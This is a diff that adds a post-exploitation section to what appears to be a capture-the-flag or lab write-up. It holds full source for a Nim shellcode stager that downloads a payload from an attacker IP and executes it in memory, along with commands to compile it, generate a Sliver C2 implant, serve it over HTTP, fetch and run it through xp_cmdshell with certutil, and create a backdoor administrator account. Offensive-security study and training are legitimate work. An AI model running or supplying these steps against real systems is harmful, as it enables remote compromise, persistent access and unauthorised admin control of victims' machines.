@@ -61,3 +61,97 @@ xp_cmdshell whoami
 
 and we got the result as `nt authority\system` and we've fully compromised the first machine !!
 ![[Pasted image 20260830110813.png]]
+
+#### Post Exploitation
+- Lets try to get a stable connection with `sliver C2`
+
+#### Shell.nim
+```python
+import winim/lean
+import httpclient
+
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+  @(str.toOpenArrayByte(0, str.high))
+
+proc DownloadExecute(url: string): void =
+  var client = newHttpClient()
+  var response: string = client.getContent(url)
+
+  var shellcode: seq[byte] = toByteSeq(response)
+  let tProcess = GetCurrentProcessId()
+  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
+  defer: CloseHandle(pHandle)
+
+  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
+  copyMem(rPtr, addr shellcode[0], len(shellcode))
+
+  let f = cast[proc() {.nimcall.}](rPtr)
+  f()
+
+when defined(windows):
+  when isMainModule:
+    DownloadExecute("http://192.168.211.2/shellc.bin")
+```
+
+- Make sure that that the ip matches our tun0 attack machine
+##### Compiling the shell.nim payload on kali linux
+```python
+sudo apt install mingw-w64
+sudo apt install nim
+nimble install winim
+nim c -d:mingw --os:windows --cpu:amd64 --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc stager.nim
+```
+
+**Next we need to generate the shell code from sliver that when it runs it reaches out to us, executes it and hopefully gets us a session.
+
+#### Now, inside sliver
+```python
+generate --mtls <tun0ip:port> --os windows --arch amd64 --format shellcode --save /home/tyler/hacksmarter/darkhaven/shellc.bin
+```
+- We've successfully generated the implant
+##### Setting up sliver listener
+```python
+mtls -L <tun0ip> -l <port>
+```
+
+- type `jobs` to confirm if the listener is active.
+
+##### Setting up python web server
+- we need to make sure that when our shell code reaches out to us, it can reach our shellc.bin and execute it.
+```python
+python3 -m http.server 80
+```
+
+
+### Now lets go back to our xp_cmdshell and use certutil to download the stager
+```python
+xp_cmdshell "certutil -urlcache -f http://<tun0ip>/update.exe" update.exe
+```
+
+### Lets run it now
+```python
+xp_cmdshell update.exe
+```
+
+#### Then check our sliver listener, we'll have a session as `NT AUTHORITY\SYSTEM`
+#### Interacting with the session
+```python
+sessions -i <first3 characters of the id>
+```
+
+
+### Create a backdoor admin account
+```python
+armory install all
+#installs all sliver extensions
+```
+
+```python
+remote-adduser tyler Hacksmarter123 localhost
+```
+
+**Now lets add the new backdoor user to administrators group**
+
+```python
+execute -o net localgroup Administrators tyler /add
+```
